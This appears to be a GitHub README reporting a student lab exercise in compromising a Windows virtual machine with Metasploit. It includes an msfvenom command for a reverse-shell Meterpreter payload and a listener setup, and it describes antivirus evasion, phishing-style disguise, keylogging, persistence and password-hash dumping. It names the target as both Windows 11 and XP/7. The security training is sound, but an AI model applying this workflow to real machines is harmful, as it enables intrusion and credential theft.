# Advanced-Penetration-Testing-on-Windows-OS-using-Metasploit-Framework

This project demonstrates the end-to-end process of exploiting a Windows 11 virtual machine using a custom-generated Meterpreter payload with Metasploit tools. It was performed as part of a cybersecurity learning module and intended strictly for ethical hacking purposes in a lab setting.

## 🧰 Tools & Technologies Used

* **msfvenom**: For generating custom Meterpreter payloads
* **msfconsole**: For setting up a listener and handling post-exploitation
* **Nmap**: For network reconnaissance
* **Kali Linux**: Attacker machine (VM)
* **Windows XP / Windows 7**: Target machine (VM)
* **VirtualBox / VMware**: Virtualization platform
* **Metasploit Framework**
* **Screenshots & Logs**: To document all major steps

---

## 📌 Project Objective

To ethically exploit a vulnerable Windows machine using the Metasploit framework, understand the complete attack lifecycle, and perform post-exploitation tasks such as privilege escalation, persistence, and data extraction.

---

## 📁 Table of Contents

1. [Executive Summary]
2. [Introduction]
3. [Methodology]

   * [3.1 Metasploit Payload Generation (msfvenom)]
   * [3.2 Exploitation Using msfconsole]
4. [Findings]

   * [4.1 Reconnaissance]
   * [4.2 Payload Generation]
   * [4.3 Payload Spoofing]
   * [4.4 Exploitation Process]
   * [4.5 Post-Exploitation]
   * [4.6 Privilege Escalation]
   * [4.7 Persistence]
   * [4.8 Hashdump & Other Activities]
5. [Recommendations]
6. [Conclusion]

---

## 📝 Executive Summary

This project simulates a real-world cyberattack within a controlled lab environment to understand the inner workings of payload generation, exploitation, and post-exploitation activities. Using Kali Linux as the attacker machine and a vulnerable version of Windows XP/7 as the target, we demonstrate how ethical hackers or penetration testers can simulate attacks using the Metasploit Framework.

---

## 🔍 Introduction

Metasploit is a powerful penetration testing tool used by security professionals to simulate cyberattacks. This project focuses on the delivery and execution of a reverse shell payload on a Windows machine using `msfvenom` and handling the connection through `msfconsole`. The aim is to learn hands-on how threat actors operate and how to better defend against such attacks.

---

## ⚙️ Methodology

### 3.1 Metasploit Payload Generation (`msfvenom`)

We created a Windows reverse TCP payload using `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > payload.exe
```

We also encoded the payload with multiple iterations to evade antivirus detection.

### 3.2 Exploitation Using `msfconsole`

Once the payload was transferred to the Windows machine (via spoofing/email delivery), we set up a listener using `msfconsole`:

```bash
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST <attacker_ip>  
set LPORT <port>  
run
```

Upon execution by the victim, a Meterpreter session was opened.

---

## 🔎 Findings

### 4.1 Reconnaissance

* Performed IP and port scanning using Nmap to ensure target visibility
* Identified open ports and OS version

### 4.2 Payload Generation

* Created custom payload using `msfvenom`
* Multiple encoders used to bypass antivirus
* Tested on VirusTotal for stealth validation

### 4.3 Payload Spoofing

* Payload was disguised as a legitimate software installer
* Delivered using USB or simulated email phishing

### 4.4 Exploitation Process

* Listener setup on attacker machine using `msfconsole`
* Victim executed payload → reverse shell connection established

### 4.5 Post-Exploitation

* File system navigation
* Webcam capture, keystroke logging (optional)
* Screenshot capture and token access

### 4.6 Privilege Escalation

* Enumerated services and vulnerable binaries
* Used built-in Metasploit modules for local privilege escalation

### 4.7 Persistence

* Added payload to startup registry or scheduled tasks
* Ensured session continuity after reboot

### 4.8 Hashdump & Other Activities

* Dumped user password hashes from SAM database
* Extracted credentials and tokens

---

## ✅ Recommendations

* Keep antivirus and firewall enabled and up to date
* Disable unnecessary services and ports
* Regularly patch operating systems and software
* Train users against social engineering attacks
* Use endpoint protection tools and monitoring software

---

## 🌟 Conclusion

This project provides a complete demonstration of the cyber kill chain: reconnaissance, payload generation, exploitation, and post-exploitation. It highlights the importance of system hardening, user awareness, and proactive defense mechanisms.

**DISCLAIMER:**
This project was conducted in a safe and controlled environment. Never perform penetration testing without proper authorization.

---

## 📷 Screenshots

Include screenshots of:

* Nmap scans
* Payload creation
* Listener setup
* Meterpreter session
* Post-exploitation commands

---

## 🧠 Skills Gained

* Penetration Testing
* Metasploit Framework
* Payload Encoding & Evasion
* Network Reconnaissance
* Exploitation Lifecycle
* Post-Exploitation Techniques

---

## 📌 References

* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
* [Nmap Documentation](https://nmap.org/book/man.html)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 👨‍💼 Author

**Sarthak Singh Gaur**

---


## 📄 License

This project is licensed under the [MIT License](LICENSE).

---
